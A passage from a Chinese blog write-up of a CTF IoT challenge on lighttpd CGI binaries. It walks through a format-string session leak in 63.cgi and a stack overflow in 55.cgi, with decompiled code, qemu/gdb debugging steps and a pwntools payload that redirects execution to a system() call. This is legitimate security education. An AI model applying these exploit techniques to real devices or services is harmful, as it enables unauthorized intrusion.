s1[<span class="number">4</span>];</span><br><span class="line">      v8 = s1[<span class="number">5</span>] + <span class="number">2</span> * v9;</span><br><span class="line">      n = s1[<span class="number">6</span>] + <span class="number">4</span> * v8;</span><br><span class="line">      v6 = s1[<span class="number">7</span>];</span><br><span class="line">      v5 = s1[<span class="number">8</span>] + <span class="number">2</span> * v6;</span><br><span class="line">      <span class="built_in">memset</span>(v2, <span class="number">0</span>, <span class="keyword">sizeof</span>(v2));</span><br><span class="line">      <span class="built_in">memcpy</span>(v2, s1, n);</span><br><span class="line">      result = <span class="built_in">strstr</span>(v2, <span class="string">&quot;*#$^&quot;</span>);</span><br><span class="line">      v4 = result;</span><br><span class="line">      <span class="keyword">if</span> ( result )</span><br><span class="line">      &#123;</span><br><span class="line">        v3 = &amp;v4[v5 - <span class="number">77</span>];</span><br><span class="line">        <span class="keyword">if</span> ( *v3 )</span><br><span class="line">          result = sub_10AFC(v3, v5);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      result = <span class="built_in">strstr</span>(v2, <span class="string">&quot;ping&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( result )</span><br><span class="line">        result = (<span class="type">char</span> *)sub_109B0(<span class="string">&quot;20.21.2.26&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>会取参数<code>*#$^</code>的值并进行一系列的传递值，然后执行<code>sub_10AFC(v3, v5);</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *__fastcall <span class="title function_">sub_10AFC</span><span class="params">(<span class="type">char</span> *result, <span class="type">size_t</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> dest[<span class="number">752</span>]; <span class="comment">// [sp+Ch] [bp-2F8h] BYREF</span></span><br><span class="line">  <span class="type">size_t</span> n; <span class="comment">// [sp+2FCh] [bp-8h]</span></span><br><span class="line"></span><br><span class="line">  n = a2;</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">    result = <span class="built_in">strncpy</span>(dest, result, n);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里是进行了<code>copy</code>的操作，但是我们可以控制<code>v5</code>的值，<code>v5</code>变量类型是<code>size_t</code>，也就是<code>4个字节</code>大小，但是这里栈大小就是<code>0x2f8</code>，我们可以复制的大小为<code>0xffffffff</code>，完完全全的是栈溢出</p>
+<p>我们看看另一个程序</p>
+<h2 id="63-cgi"><code>63.cgi</code></h2>
+<p>这个程序的不同点就在于验证对<code>session</code>的部分中</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_108C8</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">20</span>]; <span class="comment">// [sp+0h] [bp-54h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s2[<span class="number">20</span>]; <span class="comment">// [sp+14h] [bp-40h] BYREF</span></span><br><span class="line">  <span class="type">char</span> haystack[<span class="number">24</span>]; <span class="comment">// [sp+28h] [bp-2Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> *format; <span class="comment">// [sp+40h] [bp-14h]</span></span><br><span class="line">  <span class="type">char</span> *v5; <span class="comment">// [sp+44h] [bp-10h]</span></span><br><span class="line">  <span class="type">char</span> *v6; <span class="comment">// [sp+48h] [bp-Ch]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [sp+4Ch] [bp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  v6 = getenv(<span class="string">&quot;HTTP_COOKIES&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x11</span>u);</span><br><span class="line">  sub_107E8(s);</span><br><span class="line">  <span class="keyword">if</span> ( v6 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(haystack, <span class="number">0</span>, <span class="number">0x17</span>u);</span><br><span class="line">    <span class="built_in">snprintf</span>(haystack, <span class="number">0x16</span>u, <span class="string">&quot;%s&quot;</span>, v6);</span><br><span class="line">    v5 = <span class="built_in">strstr</span>(haystack, <span class="string">&quot;uuid=&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      format = v5 + <span class="number">5</span>;</span><br><span class="line">      <span class="built_in">memset</span>(s2, <span class="number">0</span>, <span class="number">0x11</span>u);</span><br><span class="line">      <span class="built_in">snprintf</span>(s2, <span class="number">0x11</span>u, v5 + <span class="number">5</span>);              <span class="comment">// 格式化字符串漏洞</span></span><br><span class="line">      <span class="built_in">puts</span>(s2);</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(s, s2, <span class="number">0x10</span>u) )</span><br><span class="line">        v7 = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>一个格式化字符串漏洞，十分明显，我们上面把服务器的<code>session</code>读到了栈空间上，我们就可以通过格式化字符串读取到<code>session</code></p>
+<p>官方<code>wp</code>上没有说如何调试<code>63.cgi</code>，但是我根据上面分析的，我们可以模拟<code>lighttpd</code>操作设置环境变量来实现</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> REQUEST_METHOD=POST                                                                                   </span><br><span class="line"><span class="built_in">export</span> HTTP_COOKIES=<span class="string">&#x27;uuid=Feng_ZZ&#x27;</span></span><br><span class="line"><span class="built_in">export</span> CONTENT_LENGTH=3000</span><br><span class="line"><span class="built_in">export</span> CONTENT_TYPE=<span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span></span><br></pre></td></tr></table></figure>
+<img src="/2024/03/16/iot-lighttpd/image-20240316192256669.png" class="" title="image-20240316192256669">
+<h2 id="泄露session">泄露<code>session</code></h2>
+<p>然后跟我们使用<code>qemu</code>的用户模拟来运行<code>63.cgi</code></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-arm -L ../../../ ./63.cgi  <span class="comment">#-L 指定链接库</span></span><br></pre></td></tr></table></figure>
+<img src="/2024/03/16/iot-lighttpd/image-20240316192136218.png" class="" title="image-20240316192136218">
+<p>看看是否可以格式化字符串漏洞</p>
+<p>把<code>HTTP_COOKIES</code>修改为<code>%p%p%p</code>，看它是否会打印出来数值</p>
+<img src="/2024/03/16/iot-lighttpd/image-20240316192419399.png" class="" title="image-20240316192419399">
+<p>很明显的打印出来了，我们下面调试一下，确认一下<code>session</code>在栈的位置以及如何泄露出来</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-arm -g 1234 -L ../../../ ./63.cgi</span><br></pre></td></tr></table></figure>
+<p>然后我们<code>gdb-multiarch</code>连接</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-multiarch  ./63.cgi</span><br></pre></td></tr></table></figure>
+<p>在对应位置下断点</p>
+<img src="/2024/03/16/iot-lighttpd/image-20240316195333021.png" class="" title="image-20240316195333021">
+<p><code>session</code>是在栈顶的位置</p>
+<blockquote>
+<p>当参数在4个以内时使用<code>r0-r3</code>寄存器分别传递1－4号参数，后面通过栈传递</p>
+</blockquote>
+<p>但是经过调试可以发现，我们通过<code>%2$p</code>就可以泄露出来第一段<code>session</code>，有点点小疑惑</p>
+<img src="/2024/03/16/iot-lighttpd/image-20240316200031079.png" class="" title="image-20240316200031079">
+<p>所以我们也知道如何泄露出来<code>session</code>了，就可以利用<code>55.cgi</code>的栈溢出来实现拿<code>shell</code></p>
+<h2 id="栈溢出拿shell">栈溢出拿<code>shell</code></h2>
+<p>通过分析<code>55.cgi</code>，我们知道在<code>sub_10B48(0);</code>中有栈溢出的漏洞，我们现在需要分析一下如何利用这个漏洞</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *__fastcall <span class="title function_">sub_10B48</span><span class="params">(<span class="type">char</span> *result)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int8 *s1; <span class="comment">// [sp+4h] [bp-D20h]</span></span><br><span class="line">  <span class="type">char</span> v2[<span class="number">3316</span>]; <span class="comment">// [sp+Ch] [bp-D18h] BYREF</span></span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// [sp+D00h] [bp-24h]</span></span><br><span class="line">  <span class="type">char</span> *v4; <span class="comment">// [sp+D04h] [bp-20h]</span></span><br><span class="line">  <span class="type">size_t</span> v5; <span class="comment">// [sp+D08h] [bp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [sp+D0Ch] [bp-18h]</span></span><br><span class="line">  <span class="type">size_t</span> n; <span class="comment">// [sp+D10h] [bp-14h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [sp+D14h] [bp-10h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [sp+D18h] [bp-Ch]</span></span><br><span class="line">  <span class="type">char</span> *s2; <span class="comment">// [sp+D1Ch] [bp-8h]</span></span><br><span class="line"></span><br><span class="line">  s1 = (<span class="type">unsigned</span> __int8 *)result;</span><br><span class="line">  s2 = <span class="string">&quot;*#$^&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(result, s2, <span class="number">4u</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v9 = s1[<span class="number">4</span>];</span><br><span class="line">      v8 = s1[<span class="number">5</span>] + <span class="number">2</span> * v9;</span><br><span class="line">      n = s1[<span class="number">6</span>] + <span class="number">4</span> * v8;</span><br><span class="line">      v6 = s1[<span class="number">7</span>];</span><br><span class="line">      v5 = s1[<span class="number">8</span>] + <span class="number">2</span> * v6;</span><br><span class="line">      <span class="built_in">memset</span>(v2, <span class="number">0</span>, <span class="keyword">sizeof</span>(v2));</span><br><span class="line">      <span class="built_in">memcpy</span>(v2, s1, n);</span><br><span class="line">      result = <span class="built_in">strstr</span>(v2, <span class="string">&quot;*#$^&quot;</span>);</span><br><span class="line">      v4 = result;</span><br><span class="line">      <span class="keyword">if</span> ( result )</span><br><span class="line">      &#123;</span><br><span class="line">        v3 = &amp;v4[v5 - <span class="number">77</span>];</span><br><span class="line">        <span class="keyword">if</span> ( *v3 )</span><br><span class="line">          result = sub_10AFC(v3, v5);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      result = <span class="built_in">strstr</span>(v2, <span class="string">&quot;ping&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( result )</span><br><span class="line">        result = (<span class="type">char</span> *)sub_109B0(<span class="string">&quot;20.21.2.26&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到我们可以通过<code>*#$^</code>参数来控制<code>v3</code>和<code>v5</code>对应的值，进入到<code>sub_10AFC</code>中，这里调用了<code>strncpy</code>但是没有对大小进行限制，所以我们可以通过这个来实现栈溢出</p>
+<p>现在问题就是如何精准的控制参数来覆盖了，就是疯狂的调试:confounded:</p>
+<p>当然我偷懒了 省略了一下调试过程，这里用官方<code>wp</code>栈溢出的部分，这里用的刚好的是在<code>sub_109B0</code>中调用<code>system</code>的<code>gadget</code>：</p>
+<blockquote>
+<p>问就是累了</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;*#$^&quot;</span> + <span class="string">b&quot;\xff&quot;</span> * <span class="number">3</span> + <span class="string">b&quot;\xff&quot;</span> * <span class="number">3</span> </span><br><span class="line">payload = payload.ljust(<span class="number">0x2b0</span>, <span class="string">b&quot;B&quot;</span>) </span><br><span class="line">payload += <span class="string">b&#x27;cat /flag;&#x27;</span> </span><br><span class="line">payload = payload.ljust(<span class="number">0x5A8</span>, <span class="string">b&quot;C&quot;</span>) </span><br><span class="line">payload += p32(<span class="number">0x000109DC</span>) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;text.txt&quot;</span>,<span class="string">&quot;wb+&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(payload)</span><br></pre></td></tr></table></figure>
+<p>这里有所改动就是把他的反弹<code>shell</code>进行修改成为<code>cat /flag</code>，不知道是什么原因直接执行<code>system(“/bin/sh”)</code>会有问题</p>
+<p>调试方法就是:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat payload | qemu-arm -g 1234 -L ../../../ ./55.cgi</span><br></pre></td></tr></table></figure>
+<p>通过管道符进行输入 给我打开了全新的调试思路</p>
+<p>调试的部分同上面<code>63.cgi</code></p>
+<img src="/2024/03/16/iot-lighttpd/image-20240317172357216.png" class="" title="image-20240317172357216">
+<p><code>arm</code>架构的栈溢出跟我们正常<code>pwn</code>题的利用手法实际上没有特别大的差别，只能说没有<code>mips</code>的恶心</p>
+<h1>最后</h1>
+<p>下面估计会复现另一道西湖论剑关于<code>lighttpd</code>的题，属于是乘热打铁了，但是</p>
+<p>累死了！！！！！！！！！！！:sleeping:</p>
+
+    </article>
+    <!-- license -->
+    
+    <!-- paginator -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2024/03/12/IOT-qemu%E6%A8%A1%E6%8B%9F/" title="IOT-qenu模拟">
+                    <div class="prevTitle">IOT-qenu模拟</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- comment -->
+    
+        <div class="post-comment">
+            <!-- 来必力 City 版安装代码 -->
+
+
+            
+
+            
+
+            
+
+            <!-- utteranc评论 -->
+
+
+            <!-- partial('_partial/comment/changyan') -->
+            <!--PC版-->
+
+
+            
+            
+
+            
+
+        </div>
+    
+    <!-- timeliness note -->
+    <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
+    
+    <!-- Mathjax -->
+    
+</main>
+
+                <!-- profile -->
+                
+            </div>
+            <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+        <div class="social">
+            
+    
+        
+            
+                <a href="mailto:test@qq.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/Feng-ZZ-pwn" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+            
+                <span class="iconfont-archer wechat" title=wechat>
+                    
+                    <img class="profile-qr" src="/assets/example_qr.png" />
+                </span>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+
+        </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- website approve for Chinese user -->
+    
+    <!-- 不蒜子  -->
+    
+        <div class="busuanzi-container">
+            
+             
+                <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+            
+        </div>
+    	
+</footer>
+
+        </div>
+        <!-- toc -->
+        
+            <div class="toc-wrapper toc-wrapper-loding" style=
+
+
+
+
+
+
+
+    top:50vh;
+
+>
+                <div class="toc-catalog">
+                    <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+                </div>
+                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#lighttpd%E4%B8%8Ecgi%E7%9A%84%E8%B0%83%E7%94%A8"><span class="toc-number">1.1.</span> <span class="toc-text">lighttpd与cgi的调用</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">西湖论剑2021——many cgi of lighttpd</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#55-cgi"><span class="toc-number">2.1.</span> <span class="toc-text">55.cgi</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#63-cgi"><span class="toc-number">2.2.</span> <span class="toc-text">63.cgi</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2session"><span class="toc-number">2.3.</span> <span class="toc-text">泄露session</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%88%E6%BA%A2%E5%87%BA%E6%8B%BFshell"><span class="toc-number">2.4.</span> <span class="toc-text">栈溢出拿shell</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">最后</span></a></li></ol>
+            </div>
+        
+        <!-- sidebar -->
+        <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+        <div class="sidebar-panel-archives">
+    <!-- 在 ejs 中将 archive 按照时间排序 -->
+    
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 4
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+        
+            
+            
+            <div class="archive-year"> 2024 </div>
+            <ul class="year-list">
+            
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/16</span>
+            <a class="archive-post-title" href="/2024/03/16/iot-lighttpd/">IOT_Lighttpd</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/12</span>
+            <a class="archive-post-title" href="/2024/03/12/IOT-qemu%E6%A8%A1%E6%8B%9F/">IOT-qenu模拟</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/26</span>
+            <a class="archive-post-title" href="/2024/02/26/2024VNCTF-PWN/">2024VNCTF--PWN</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/26</span>
+            <a class="archive-post-title" href="/2024/02/26/zer0pts-2020-babybof/">zer0pts_2020_babybof</a>
+        </li>
+    
+    </div>
+</div>
+
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+        
+            <span class="sidebar-tag-name" data-tags="IOT">
+                <span class="iconfont-archer">&#xe606;</span>
+                IOT
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="VNCTF">
+                <span class="iconfont-archer">&#xe606;</span>
+                VNCTF
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="BUUCTF">
+                <span class="iconfont-archer">&#xe606;</span>
+                BUUCTF
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="做题复现">
+                <span class="iconfont-archer">&#xe606;</span>
+                做题复现
+            </span>
+        
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+        缺失模块，请参考主题文档进行安装配置：https://github.com/fi3ework/hexo-theme-archer#%E5%AE%89%E8%A3%85%E4%B8%BB%E9%A2%98
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="IOT">
+            <span class="iconfont-archer">&#xe60a;</span>
+            IOT
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="WP">
+            <span class="iconfont-archer">&#xe60a;</span>
+            WP
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="BUUCTF_WP">
+            <span class="iconfont-archer">&#xe60a;</span>
+            BUUCTF_WP
+        </span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+
+    </div>
+</div>
+
+        <!-- site-meta -->
+        <script>
+    var siteMetaRoot = "/"
+    if (siteMetaRoot === "undefined") {
+        siteMetaRoot = '/'
+    }
+    var siteMeta = {
+        url: "https://feng-zz-pwn.github.io",
+        root: siteMetaRoot,
+        author: "Feng_ZZ"
+    }
+</script>
+
+        <!-- import experimental options here -->
+        <!-- Custom Font -->
+
+
+        <!-- main func -->
+        <script src="/scripts/main.js?v=20211217"></script>
+        <!-- dark mode -->
+        <script src="/scripts/dark.js?v=20211217"></script>
+        <!-- fancybox -->
+        <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" defer></script>
+        <!-- algolia -->
+        
+        <!-- busuanzi -->
+        
+            <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+        
+        <!-- CNZZ -->
+        
+        <!-- async load share.js -->
+        
+            <script src="/scripts/share.js?v=20211217" async></script>
+        
+        <!-- mermaid -->
+        
+    </body>
+</html>
